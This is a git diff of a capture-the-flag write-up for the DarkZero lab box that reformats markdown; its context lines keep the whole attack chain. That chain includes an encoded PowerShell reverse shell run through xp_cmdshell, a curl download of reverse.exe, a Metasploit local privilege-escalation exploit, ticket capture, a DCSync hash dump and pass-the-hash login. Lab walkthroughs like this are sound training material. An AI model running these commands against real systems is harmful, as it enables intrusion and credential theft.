@@ -1,6 +1,6 @@
 - As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!
 ### Nmap
-```bash
+```
 sudo nmap -sS -sV -sC -vv 10.10.11.89
 
 ---OUTPUT---
@@ -211,7 +211,7 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 - I see mssql open and evilwinrm wont login:
-```bash
+```
 impacket-mssqlclient john.w@DC01.darkzero.htb -windows-auth
 Password: RFulUtONCOL!
 
@@ -229,7 +229,7 @@ SQL (darkzero\john.w  guest@master)>
 ```
 xp_cmdshell fails but we check other links to move to:
 
-```bash
+```
 enum_links
 
 ---OUTPUT---
@@ -261,7 +261,7 @@ EXECUTE xp_cmdshell 'whoami'
 EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAxACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
 ```
 
-![[Pasted image 20251207164657.png]]
+![Pasted image 20251207164657](../Attachments/Pasted%20image%2020251207164657.png)
 - We get a shell on `DC02` (this is not our target)
 - Now we need to gain admin shell.
 - To do that the vulnerability is the windows version and build : Windows Server 2022 (build 10.0.20348)
@@ -287,7 +287,7 @@ curl http://10.10.14.21/reverse.exe -o rev.exe
 .\rev.exe
 .\rev.exe
 ```
-![[Pasted image 20251207223258.png]]
+![Pasted image 20251207223258](../Attachments/Pasted%20image%2020251207223258.png)
 - then with these sessions in background I execute the exploit on the second session:
 ```
 use exploit/windows/local/cve_2024_30088_authz_basep
@@ -296,9 +296,9 @@ set SESSION 2
 exploit
 ```
 
-![[Pasted image 20251207223519.png]]
+![Pasted image 20251207223519](../Attachments/Pasted%20image%2020251207223519.png)
 
-![[Pasted image 20251207223545.png]]
+![Pasted image 20251207223545](../Attachments/Pasted%20image%2020251207223545.png)
 
 - can get into the session owned by NT authority.
 - Now as NT authority we can perform DC Sync attack on DC01
@@ -323,7 +323,7 @@ EXEC xp_dirtree \\DC02.darkzero.ext\ticket
 
     doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDap1ipZ4RMxGLVUZJ6mx6mwEoPYWYHsKGV0IJyIghla0bP+PGtyUIicTn38DO8f6QB/c3p1YLUAXA//2EVtPTTflOzgVqcr1WC+bA88YG1/aT0/eWViG6HA2aPQtRA/3rhLKNIaqWFZ/ohTyHaF2lnSwtK4ZpJfmzU0g9j+/k7DFJCv/7+2c1AMhwlTzIxkZYxDM5UfVYwkmxNvXIRnWB6yKuwB+E1BvLyEqzHpUOxKGj7B/O20nbpZtI00Pyg/nBWP5CiQ0uRFa6/RJyVF6SjjeB3C4pyiUfaQBVVw7WpydW1N3DB5VP6ufsFVmasIBmjK+3dIDnhP0jzQzkqQCEtI9ghVyY3nHUUCCBh9s/8WVyvi4ZyheePx2ZG6J+DMrm5NGIaRIdwvcN6P0Wn4Rj6O6SuieHZQHXZlaD0ksELJgckiobo0IIR6od56qtpNDt75GpU3PUPVPLeNvePEIjkv4gkB8T+MbXyM7JfDC0Y7JBu9p0U6DL1Cfx1i4aEU8Um7TuLYO0bZdmJzuMEIi5nsJBaAvfyFZpiFqZPOlzrI+ChJh9b9Bp8K68J1pGqsi7vGpe10uOLOacW4gduv1SYwRQAZq/mfp090SPdzMEanSYLGBowUgE4xOOJ5izcGTn4+HczVu5huveEl/t/JsdhjU6V6f0Q7RX53uDCYymaeC5CkS7nEEV9IpyvcHREkLESUTcGi7MqT9YXSXBE2sRoIdwLrF1D/ypUmBaFOe5oWTYnKqYGyqHvKrvJ9SVi9+AN/OBFAg+iJpqi2+lBQwPgvDq1de7A02J4p9YUm1sNdRHXKXJrLNhZVJevGDfw/Bt21i44gnyuohItiQ3pKtDSoQj0mqiPytwtRednRmt+fkT6TeJE4aOWJbZO5mNfXLA7IXyRZ6YnURXdJKI0aDstrS/MC6i9TMLaclmL+zA5Jv+dEviweAFRHEJNEFEYHus7n7nlc77fQ9NkbnvQ6t9e0b5i7TOnJm5ha4Za++Br1uLnk5hxu0zAGyWQ7LAQxcEaJ8GZHXvMohhwZ3oVfdXXFWhps/hC1QUeJ03s63c6AwzAwn/9fll9SQK9xywtxhDgyUXxM/7qT3yVGQf7cxdIzwKryT2GZ9aaH8QPHjvpvDURZYXgj6FJvBrgINNaKA6JqdOIff8KC0LoL+UtOjxaJdM7x026I6kipn1LamYTCeRHbg5YQjMZUfKWUV4JWolTQNN2I5vw2AUZ9XLTqTI8fd0AZ8NVc6+rdB2lq0NjtzETpKOi6U0laThZ8tD+3yOkUgLEARtOj20fZpqlLSSEvJwrfKEGJ+Mplg/EFr0iipR6DKSOfy1UiPhZd1muc628thqSZrGQi+8lhH4O2+U5QbpAw7zMVD+DspMN2Q1jkeZkhTHBlwc4YV/sYjdPHabyuWvcDK4W3zzoxhGX461BzMSeGyYYZo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQguML+FIyxT17CC3OGQW1bLAR67jq+31u/vSiRZ/YP+WShDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEyMDgwOTAwNTJaphEYDzIwMjUxMjA4MTkwMDUyWqcRGA8yMDI1MTIxNTA5MDA1MlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI
 ```
-![[Pasted image 20251207223930.png]]
+![Pasted image 20251207223930](../Attachments/Pasted%20image%2020251207223930.png)
 - I copy the encoded ticket into `tgt.b64` and decode it to `tgt.kirbi`
 ```
 cat tgt.b64 | base64 --d > tgt.kirbi
@@ -332,7 +332,7 @@ cat tgt.b64 | base64 --d > tgt.kirbi
 ```
 impacket-ticketConverter tgt.kirbi admin.ccache
 ```
-![[Pasted image 20251207224117.png]]
+![Pasted image 20251207224117](../Attachments/Pasted%20image%2020251207224117.png)
 - I export the ticket and try to dump hashes:
 ```
 impacket-secretsdump -k -no-pass darkzero.htb/DC01\$@DC01.darkzero.htb -dc-ip 10.10.11.89
@@ -376,11 +376,11 @@ darkzero-ext$:aes128-cts-hmac-sha1-96:1108895c6d925042d9bed0e258f19ca2
 darkzero-ext$:0x17:5a9caebc3a454826fdb856385be9d23f
 [*] Cleaning up...
 ```
-![[Pasted image 20251207224315.png]]
+![Pasted image 20251207224315](../Attachments/Pasted%20image%2020251207224315.png)
 
 - Using the `Administrator` hash I logged into DC01 and grabbed the uesr and root flag:
 ```
 evil-winrm -u Administrator -H '5917507bdf2ef2c2b0a869a1cba40726' -i 10.10.11.89
 ```
-![[Pasted image 20251207224407.png]]
-![[Pasted image 20251207224441.png]]
+![Pasted image 20251207224407](../Attachments/Pasted%20image%2020251207224407.png)
+![Pasted image 20251207224441](../Attachments/Pasted%20image%2020251207224441.png)
